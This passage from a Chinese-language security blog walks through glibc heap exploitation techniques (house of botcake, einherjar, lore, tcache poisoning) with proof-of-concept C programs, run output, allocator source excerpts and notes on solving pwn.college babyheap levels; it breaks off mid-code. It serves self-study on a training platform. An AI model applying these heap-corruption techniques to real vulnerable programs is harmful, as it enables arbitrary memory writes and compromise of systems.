with b </span></span><br><span class="line">    tcache_chunks[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//make room for </span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">malloc</span>(b);</span><br><span class="line">    b[<span class="number">0</span>]=<span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_botcake.c -o house_of_botcake -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_botcake</span><br><span class="line">0x1122334455667788</span><br></pre></td></tr></table></figure>



<h4 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h4><p>攻击假设:</p>
<p>0.能够控制<code>tcache</code>的状态</p>
<p>1.堆块申请时,复用下一堆块的<code>prev_size</code>字段,能够构造假的<code>prev_size</code>字段</p>
<p>并且存在<code>off-by-one</code>,能够再修改<code>size</code>的标志位中的<code>prev_in_use</code></p>
<p>画个图意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241104213606983.png" alt="image-20241104213606983"></p>
<p><code>b</code>最终被释放进入<code>tcache</code>之后,可以使用<code>fake_chunk</code>改写<code>tcache</code>的元数据进行投毒</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *c;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_header;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_mem;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_chunk_header = a;          <span class="comment">//consruct a fake chunk inside chunk a&#x27;s memory</span></span><br><span class="line">    fake_chunk_header[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">1</span>] = <span class="number">0x130</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">2</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_header[<span class="number">3</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_mem = fake_chunk_header + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0x30</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = <span class="number">0x130</span>;         <span class="comment">//fake_c_prevsize</span></span><br><span class="line">    <span class="type">char</span> * size_ptr = &amp;b[<span class="number">0x38</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]; </span><br><span class="line">    *size_ptr= <span class="number">0</span>;     <span class="comment">//off by one</span></span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x220</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem: %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    assert(target == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_einherjar.c -o house_of_einherjar -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_einherjar</span><br><span class="line">target: 0x5591c4d6f9b0</span><br><span class="line">fake_chunk_mem: 0x5591c4d6f9b0</span><br></pre></td></tr></table></figure>



<h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h4><p>攻击假设:对释放进入<code>smallbins</code>中的堆块有<code>UAF</code>,能够修改其<code>bk</code>指针</p>
<p>1.释放一个堆块<code>victim</code>进入<code>smallbins</code></p>
<p>2.对<code>victim</code>进行<code>UAF</code>,修改其<code>bk</code>指针指向<code>a</code>堆块</p>
<p>3.<code>a</code>前与<code>victim</code>相连,后与<code>b</code>相连</p>
<p>4.<code>b</code>后面只使用<code>bk</code>指针挂了一串堆块(能够填满<code>tcahe</code>)</p>
<p>5.清空<code>tcache</code>然后<code>malloc</code>,导致<code>a</code>,<code>b</code>以及一连串拖家带口进入<code>tcache</code></p>
<p>6.此后从<code>tcache</code>中分配可以进行任意地址写</p>
<p>画个图意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241105134342656.png" alt="house_of_lore"></p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> *fd;</span><br><span class="line">    <span class="type">size_t</span> *bk;</span><br><span class="line">&#125;BinChunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *victim_header;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    BinChunk a;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk b;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk fake_freelist[<span class="number">7</span>];		<span class="comment">//on stack</span></span><br><span class="line">    <span class="type">size_t</span> * target;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        fake_freelist[i].bk = &amp;fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">    &#125;       <span class="comment">//fake_freelist[0] =&gt; fake_freelist[1] =&gt; fake_freelist[2] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    victim_header = (<span class="type">char</span>*)victim - <span class="number">0x10</span>;</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(victim);           <span class="comment">//now victim is in unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);         <span class="comment">//sort victim into smallbin</span></span><br><span class="line">    <span class="comment">//suppose we have UAF to modify victim.bk points to a</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">    victim[<span class="number">1</span>] = &amp;a; <span class="comment">//UAF</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    a.fd = victim_header;</span><br><span class="line">    a.bk = &amp;b;</span><br><span class="line">    b.fd = &amp;a;</span><br><span class="line">    b.bk = &amp;fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// smallbins[idx] =&gt; victim &lt;=&gt; a &lt;=&gt; b =&gt; fake_freelist[0] =&gt; fake_freelist[1] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);   <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//get victim again and use smallbins to fill tcache</span></span><br><span class="line">    <span class="comment">//tcache[idx] =&gt; fake_freelist[4] =&gt; fake_freelist[3] =&gt; fake_freelist[2] =&gt; fake_freelist[1] =&gt; fake_freelist[0] =&gt;b =&gt;a</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//fetch fake_freelist[4] from tcache</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target = %p\n&quot;</span>,target);</span><br><span class="line">    assert(target == &amp;fake_freelist[<span class="number">4</span>].fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_lore.c -o house_of_lore -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_lore</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">target = 0x7ffd93539ed0</span><br></pre></td></tr></table></figure>



<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><p>攻击假设:</p>
<p>0.只有<code>malloc</code>,没有<code>calloc</code></p>
<p>1.最多持有16个堆块指针,可以填充<code>tcache</code></p>
<p>2.<code>free</code>之后不清空指针,可以<code>UAF</code></p>
<p>可以考虑 <code>fastbin_dup_with_consolidate</code>的思路</p>
<p>0.填充tcache</p>
<p>1.找一个与topchunk相邻的小堆块,free进入fastbins</p>
<p>2.read_flag发起0x52A字节的分配请求,合并fastbins堆块到topchunk,并拿到flag_chunk</p>
<p>3.直接从小堆块上UAF,puts即可泄露flag</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>攻击假设:</p>
<p>0.有malloc也有calloc, malloc最大0x420, calloc无限制</p>
<p>1.free不清空指针,UAF</p>
<ol start="2">
<li></li>
</ol>
<h3 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h3><p>最小3000字节的堆块</p>
<p>只能考虑largebins和unsortedbin的利用方法</p>
<p>目标是将<code>authenticated @ 0x4041C0</code>写上任意值</p>
<p>步骤:</p>
<p>大于3000字节的largebin,比如<code>0xbc0-0xbf0</code></p>
<p>可以申请0xbd0,0xbe0</p>
<p>1.A &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>2.B &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>3.C &#x3D; malloc(0xbd0)</p>
<p>barrier</p>
<p>3.free(A),free(B)进入largebin,UAF泄露bin地址和堆块地址</p>
<p>4.malloc(0xbe0)拿一个出来,剩下一个</p>
<p>5.UAF将authenticated挂到bk_nextsize上</p>
<p>6.free(C)</p>
<h3 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h3><p>有越界写</p>
<p>1.UAF泄露堆块基地址</p>
<p>2.根据相对偏移量计算得到flag_chunk的地址</p>
<p>如何将alloc_struct放到堆块里?</p>
<h3 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h3><h3 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h3><p>禁用tcache</p>
<p>泄露flag地址</p>
<p>fastbin利用,有UAF,</p>
<h3 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h3><p>最大申请0x1000</p>
<p>堆风水:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">A</span><br><span class="line">----------------</span><br><span class="line">flag</span><br><span class="line">----------------</span><br><span class="line">B</span><br><span class="line">----------------</span><br><span class="line">C</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>







<p>1.通过B构造<code>C-&gt;prev_size</code>并通过<code>off-by-one</code>将<code>C-&gt;prev_in_use</code>  归0</p>
<p>2.在A中构造假的堆块头,这需要设置<code>fd</code>和<code>bk</code>指针</p>
<p>3.<code>free C</code>,向前合并到<code>A</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="T擦车"><a href="#T擦车" class="headerlink" title="T擦车"></a>T擦车</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>



<h2 id="tcache数据结构与算法"><a href="#tcache数据结构与算法" class="headerlink" title="tcache数据结构与算法"></a>tcache数据结构与算法</h2><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p> 在<code>glibc-2.27</code>上<code>Tcache</code>长这样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png" alt="image-20241009161233717"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每个线程有一个tcache,因此tcache的线程实例名叫tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//counts和entries是冗余的,只是为了性能所以使用了counts计数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//每个tcache有TCACHE_MAX_BINS = 64 个桶子</span></span><br></pre></td></tr></table></figure>

<p>显然每个桶子里面的<code>chunk</code>大小不一样,并且和桶子下标<code>idx</code>有映射关系,具体来说是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcache下标</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>在<code>amd64</code>上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><code>glibc </code>在<code>2.26</code>之后, 引入了<code>TCACHE</code>机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//计算tcache桶下标</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//下标最高是TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idx下标桶子里至少有一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//从桶子里拿一个堆块返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>没有任何嵌套, 零帧起手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFO栈</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//再确保一下没有越界</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//再确保一下至少有一个堆块</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//下一个块成为头块</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//块计数-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//返回堆块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个过程中<code>tcache-&gt;counts[tc_idx]</code>只是随手一记录,并没有根据其值判断是否还有堆块</p>
<p>真正的判断是根据桶子头指针是否为空决定的</p>
<p>当一个堆块返回到<code>tcache</code>中时, 如果可以<code>UAF</code>, 那么就可以把任意假的堆块塞进去</p>
<p>写个poc意思一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous 